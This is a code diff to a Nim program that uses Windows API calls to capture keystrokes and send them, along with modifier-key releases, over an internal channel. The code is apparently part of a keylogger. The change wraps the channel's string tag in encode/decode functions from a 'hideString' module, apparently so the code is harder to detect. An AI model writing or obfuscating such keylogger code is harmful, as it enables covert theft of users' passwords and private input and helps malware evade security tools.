@@ -38,7 +38,8 @@ from winim/inc/winuser import GetMessage
 
 from winim/utils import winimConverterBOOLToBoolean
 
-import ../functions/hideString
+from ../functions/hideString import e
+from ../functions/hideString import d
 
 from ../channels import mainChannel
 
@@ -60,7 +61,7 @@ proc processDataThread(): void {.thread.} =
       let keyText: string = $key
 
       if wparam == WM_KEYDOWN or wparam == WM_SYSKEYDOWN:
-        mainChannel.send ("k", keyText)
+        mainChannel.send (d e "k", keyText)
 
       elif wparam == WM_KEYUP or wparam == WM_SYSKEYUP:
         if key == VK_CONTROL or key == VK_LCONTROL or key == VK_RCONTROL or # ctrl
@@ -68,7 +69,7 @@ proc processDataThread(): void {.thread.} =
           key == VK_MENU or key == VK_LMENU or key == VK_RMENU or # alt
           key == VK_LWIN or key == VK_RWIN: # win
 
-          mainChannel.send ("k", "<" & keyText) # insert like [SHIFT] [a] [b] <[SHIFT]
+          mainChannel.send (d e "k", "<" & keyText) # insert like [SHIFT] [a] [b] <[SHIFT]
 
     sleep(10)
 
